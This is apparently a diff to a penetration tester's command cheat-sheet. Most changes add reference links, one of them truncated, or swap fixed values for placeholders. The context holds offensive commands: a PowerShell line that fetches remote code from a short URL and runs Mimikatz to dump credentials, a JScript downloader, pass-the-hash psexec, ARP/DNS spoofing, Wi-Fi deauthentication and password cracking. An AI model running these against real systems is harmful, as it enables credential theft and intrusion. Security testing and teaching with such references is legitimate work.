@@ -849,6 +849,7 @@ smb
 bash
 enumeration
 EOT
+https://yg.ht
 https://www.samba.org/samba/docs/man/manpages-3/smbclient.1.html
 EOR
 powershell "IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/1qMn59d'); Invoke-Mimikatz -DumpCreds"
@@ -887,6 +888,7 @@ user information
 impacket
 EOT
 https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
+https://yg.ht
 EOR
 Get-ADUser -filter * -properties * | sort-object passwordlastset | select-object samaccountname, passwordlastset, passwordneverexpires, homedirectory, mail, enabled | Export-csv -path c:\temp\pwprofile.csv
 Powershell password last changed, run on DC
@@ -896,6 +898,7 @@ enumeration
 powershell
 user information
 EOT
+https://yg.ht
 https://www.reddit.com/r/sysadmin/comments/3y0pad/some_ad_checks_you_should_be_running_on_a_regular/
 EOR
 dnscmd 127.0.0.1 /ZoneExport [FQDN] [OUT].zone
@@ -905,6 +908,7 @@ Windows
 dns
 enumeration
 EOT
+https://yg.ht
 https://technet.microsoft.com/en-us/library/cc772069(v=ws.11).aspx
 EOR
 mount -t cifs \\\\[victim]\\SYSVOL$ -o username=[user],password=[password] mount/; nautilus mount/;
@@ -934,6 +938,7 @@ networking
 enumeration
 impacket
 EOT
+https://yg.ht
 https://technet.microsoft.com/en-gb/library/bb490921.aspx
 EOR
 for i in `cat smb_up `; do timeout 10 psexec.py [user]:[pass]@$i net localgroup administrators; done | tee local_admin_information
@@ -984,6 +989,7 @@ passwords
 enumeration
 IIS
 EOT
+https://yg.ht
 https://www.iis.net/learn/get-started/getting-started-with-iis/getting-started-with-appcmdexe
 EOR
 netdom query trust
@@ -992,6 +998,7 @@ EOC
 Windows
 enumeration
 EOT
+https://yg.ht
 https://technet.microsoft.com/en-us/library/cc772217(v=ws.11).aspx
 EOR
 netsh interface portproxy show all
@@ -1000,6 +1007,7 @@ EOC
 Windows
 networking
 EOT
+https://yg.ht
 https://technet.microsoft.com/en-us/library/bb490939.aspx
 https://technet.microsoft.com/en-us/library/cc731068(v=ws.10).aspx
 EOR
@@ -1010,6 +1018,7 @@ Windows
 networking
 pivoting
 EOT
+https://yg.ht
 https://technet.microsoft.com/en-us/library/bb490939.aspx
 https://technet.microsoft.com/en-us/library/cc731068(v=ws.10).aspx
 EOR
@@ -1020,6 +1029,7 @@ Windows
 networking
 pivoting
 EOT
+https://yg.ht
 https://technet.microsoft.com/en-us/library/bb490939.aspx
 https://technet.microsoft.com/en-us/library/cc731068(v=ws.10).aspx
 EOR
@@ -1029,6 +1039,7 @@ EOC
 Windows
 enumeration
 EOT
+https://yg.ht
 https://technet.microsoft.com/en-gb/library/bb490995.aspx
 https://technet.microsoft.com/en-us/library/dd228922(v=ws.11).aspx
 EOR
@@ -1038,6 +1049,7 @@ EOC
 Windows
 enumeration
 EOT
+https://yg.ht
 https://technet.microsoft.com/en-us/library/bb490939.aspx
 EOR
 tasklist /v
@@ -1101,6 +1113,7 @@ loop
 remote command shell
 impacket
 EOT
+https://yg.ht
 https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
 EOR
 psexec.py -hashes [LM]:[NTLM] [DOM]/[USER]@[TARGET] "cmd.exe"
@@ -1130,6 +1143,7 @@ Linux
 bash
 certificates
 EOT
+https://yg.ht
 https://www.sslshopper.com/article-how-to-create-a-self-signed-certificate.html
 EOR
 wmic service get name,displayname,pathname,startmode
@@ -1163,7 +1177,7 @@ http://www.fuzzysecurity.com/tutorials/16.html
 http://pentestmonkey.net/tools/windows-privesc-check
 EOR
 sc config "[SERVICE]" start= auto
-Unquoted Service Paths
+Unquoted Service Paths, start service
 EOC
 Windows
 enumeration
@@ -1186,6 +1200,7 @@ VBA launching command
 EOC
 Windows
 EOT
+https://yg.ht
 https://support.smartbear.com/testcomplete/docs/testing-with/advanced/using-external-functions/running-powershell-scripts.html
 EOR
 echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");WinHttpReq.Open("GET",WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();BinStream = new ActiveXObject("ADODB.Stream");BinStream.Type=1;BinStream.Open();BinStream.Write(WinHttpReq.ResponseBody);BinStream.SaveToFile("out.exe");>wget.js
@@ -1230,6 +1245,7 @@ enumeration
 wireless
 wifi
 EOT
+https://yg.ht
 https://www.labnol.org/software/find-wi-fi-network-password/28949/
 EOR
 run autoroute -s [CIDR SUBNET]
@@ -1300,6 +1316,7 @@ user information
 recon
 EOT
 http://www.edge-security.com/theharvester.php
+https://yg.ht
 EOR
 /data/hacking/theHarvester/theHarvester.py -d [domain] -l 1000 -b linkedin | tee harvester-people-[DETAIL].txt
 harvester linkedin
@@ -1310,6 +1327,7 @@ user information
 recon
 EOT
 http://www.edge-security.com/theharvester.php
+https://yg.ht
 EOR
 wine KeeCracker.exe -w /data/hacking/dictionaries/rockyou.dic -t 4 Database.kdbx
 KeePass2 Cracking
@@ -1320,6 +1338,7 @@ passwords
 cracking
 EOT
 http://www.cervezhack.fr/2013/02/12/bruteforce-a-keepass-file/?lang=en
+https://yg.ht
 EOR
 find / -iname '[SEARCH TERM]' 2>/dev/null
 Find files
@@ -1327,6 +1346,7 @@ EOC
 Linux
 Files
 EOT
+https://yg.ht
 http://www.thegeekstuff.com/2009/03/15-practical-linux-find-command-examples
 https://www.cyberciti.biz/tips/linux-findinglocating-files-with-find-command-part-1.html
 EOR
@@ -1337,6 +1357,7 @@ scanning
 nessus
 EOT
 https://docs.tenable.com/nessus/6_7/Content/Command_Line/nessuscli.htm
+https://yg.ht
 EOR
 openssl s_client -connect [domain]:443
 'Telnet' s_client to SSL
@@ -1344,6 +1365,7 @@ EOC
 Linux
 certificates
 EOT
+https://yg.ht
 https://www.feistyduck.com/library/openssl-cookbook/online/ch-testing-with-openssl.html
 EOR
 ike-scan -A -v -id=test -f [input file] -P[PSK output file]
@@ -1488,6 +1510,7 @@ Linux
 networking
 MitM
 EOT
+https://yg.ht
 https://ettercap.github.io/ettercap/
 http://www.thegeekstuff.com/2012/05/ettercap-tutorial
 EOR
@@ -1500,9 +1523,10 @@ MitM
 wifi
 EOT
 https://ettercap.github.io/ettercap/
+https://yg.ht
 http://www.thegeekstuff.com/2012/05/ettercap-tutorial
 EOR
-ettercap -i wlan0 -L etter.log -T -P dns_spoof -M arp:remote -L [CLIENT+TARGET].log /[GW IP]// /[TARGET IP]//
+ettercap -i [interface] -L etter.log -T -P dns_spoof -M arp:remote -L [CLIENT+TARGET].log /[GW IP]// /[TARGET IP]//
 ARP Spoofing DNS
 EOC
 Linux
@@ -1511,6 +1535,7 @@ MitM
 wifi
 EOT
 https://ettercap.github.io/ettercap/
+https://yg.ht
 http://www.thegeekstuff.com/2012/05/ettercap-tutorial
 EOR
 ipcalc -b [CIDR Subnet]
@@ -1521,7 +1546,7 @@ subnets
 EOT
 https://www.cyberciti.biz/tips/perform-simple-manipulation-of-ip-addresse.html
 EOR
-tcpdump -n -i em1
+tcpdump -n -i [interface]
 TCPDump (no DNS resolution)
 EOC
 networking
@@ -1547,6 +1572,7 @@ loop
 networking
 scanning
 EOT
+https://yg.ht
 https://www.cyberciti.biz/faq/linux-duplicate-address-detection-with-arping/
 EOR
 ifconfig eth0 192.168.0.x/24
@@ -1609,6 +1635,17 @@ cracking
 EOT
 https://www.aircrack-ng.org/doku.php?id=cracking_wpa
 EOR
+airodump-ng -c 11 --bssid [VICTIM MAC] -w [OUTPUT] mon0
+wep cracking
+EOC
+Linux
+wireless
+wifi
+cracking
+EOT
+https://www.aircrack-ng.org/doku.php?id=simple_wep_crack
+EOR
+
 aireplay-ng -0 0 --ignore-negative-one -e [SSID] -a [AP MAC] -c [VICTIM MAC] mon0
 wep cracking
 EOC
@@ -1691,6 +1728,7 @@ Linux
 Windows
 cracking
 EOT
+https://yg.ht
 https://hashcat.net/wiki/doku.php?id=maskprocessor
 EOR
 ncrack -v -d1 -T5 -P /usr/share/wordlists/rockyou.txt [service eg vnc]://[target IP]:[port eg 5900] -oA [output file]-ncrack.txt
@@ -1717,6 +1755,7 @@ Linux
 smb
 scanning
 EOT
+https://yg.ht
 http://unixwiz.net/tools/nbtscan.html
 EOR
 for a in {0..254}; do nbtscan -v -s : 192.168.$a.0/24 >> nbtscan-192.168.$a.txt; done
@@ -1727,6 +1766,7 @@ loop
 smb
 scanning
 EOT
+https://yg.ht
 http://unixwiz.net/tools/nbtscan.html
 EOR
 for a in {0..255}; do host -t ns $a.168.192.in-addr.arpa | grep -v "name server"; done >> networks.txt
@@ -1737,6 +1777,7 @@ networking
 scanning
 dns
 EOT
+https://yg.ht
 https://www.cyberciti.biz/faq/linux-unix-host-command-examples-usage-syntax/
 EOR
 cat networks-dirty.txt | grep "^[0-9]" | awk {'print $1'} | awk -F "." {'print $3"."$2"."$1".0/24"'} | sort -u > nets.txt
@@ -1747,6 +1788,7 @@ networking
 dns
 enumeration
 EOT
+https://yg.ht
 https://www.cyberciti.biz/faq/linux-unix-host-command-examples-usage-syntax/
 EOR
 nmap -sS -n -v -T5 -iL networks-sorted.txt -oA nmapScan-ARP
@@ -1767,6 +1809,7 @@ Linux
 networking
 scanning
 EOT
+https://yg.ht
 http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
 EOR
 python -m SimpleHTTPServer [PORT]
@@ -1959,6 +2002,7 @@ bash
 networking
 configuration
 EOT
+https://yg.ht
 https://www.cyberciti.biz/tips/howto-configure-linux-virtual-local-area-network-vlan.html
 EOR
 dhclient -d -v -4 -pf /tmp/dhclient.pid -lf /tmp/dhclient.lease em1
@@ -1969,6 +2013,7 @@ bash
 networking
 configuration
 EOT
+https://yg.ht
 https://www.cyberciti.biz/faq/tag/dhclient-command/
 EOR
 cat `find /var/lib/NetworkManager/*ens10* -type f -mmin -360 -ls | awk {'print $11'}`
@@ -1978,6 +2023,7 @@ Linux
 bash
 networking
 EOT
+https://yg.ht
 https://www.cyberciti.biz/faq/tag/dhclient-command/
 EOR
 cat `find /var/lib/dhcp/dhclient*eth0* -type f -mmin -360 -ls | awk {'print $11'}`
@@ -1987,6 +2033,7 @@ Linux
 bash
 networking
 EOT
+https://yg.ht
 https://www.cyberciti.biz/faq/tag/dhclient-command/
 EOR
 ls -lt /var/lib/NetworkManager/
@@ -2006,10 +2053,11 @@ bash
 networking
 configuration
 EOT
+https://yg.ht
 https://www.cyberciti.biz/faq/linux-route-add/
 http://www.linuxhomenetworking.com/wiki/index.php/Quick_HOWTO_:_Ch03_:_Linux_Networking
 EOR
-route del -net 0.0.0.0 gw 100.64.0.1 eth1
+route del -net 0.0.0.0 gw [GW] eth1
 route table del
 EOC
 Linux
@@ -2017,6 +2065,7 @@ bash
 networking
 configuration
 EOT
+https://yg.ht
 https://www.cyberciti.biz/faq/linux-route-add/
 http://www.linuxhomenetworking.com/wiki/index.php/Quick_HOWTO_:_Ch03_:_Linux_Networking
 EOR
@@ -2027,6 +2076,7 @@ Linux
 Files
 bash
 EOT
+https://yg.ht
 https://www.cyberciti.biz/tips/how-can-i-zipping-and-unzipping-files-under-linux.html
 EOR
 ./hashcat-cli64.bin --session=[SESSIONNAME] -m[hash ID] [input file] [dict file] --rules rules/[rule file e.g. best64.rule d3ad0ne.rule etc]
@@ -2138,6 +2188,7 @@ loop
 scanning
 certificates
 EOT
+https://yg.ht
 https://github.com/rbsec/sslscan
 EOR
 openssl s_client -connect victim.com:443 (this shows the chain)
@@ -2155,6 +2206,7 @@ Linux
 bash
 certificates
 EOT
+https://yg.ht
 https://www.feistyduck.com/library/openssl-cookbook/online/ch-testing-with-openssl.html
 https://www.sslshopper.com/article-most-common-openssl-commands.html
 EOR
@@ -2165,6 +2217,7 @@ Linux
 bash
 certificates
 EOT
+https://yg.h
 https://www.feistyduck.com/library/openssl-cookbook/online/ch-testing-with-openssl.html
 https://www.sslshopper.com/article-most-common-openssl-commands.html
 EOR
@@ -2335,6 +2388,7 @@ networking
 scanning
 EOT
 https://necurity.co.uk/netsec/2015-04-20-Screenshots-with-Nmap/
+https://github.com/SpiderLabs/Nmap-Tools/commit/36d74325f5ed5a057f954c1f9dd962631766ca10
 EOR
 modprobe nbd  max_part=16;  qemu-nbd -c /dev/nbd0 [File]; fdisk -l /dev/nbd0
 moount VDI disk image
@@ -2853,6 +2907,7 @@ EOC
 Windows
 hashes
 EOT
+https://yg.ht
 https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
 https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
 http://bernardodamele.blogspot.co.uk/2011/12/dump-windows-password-hashes.html
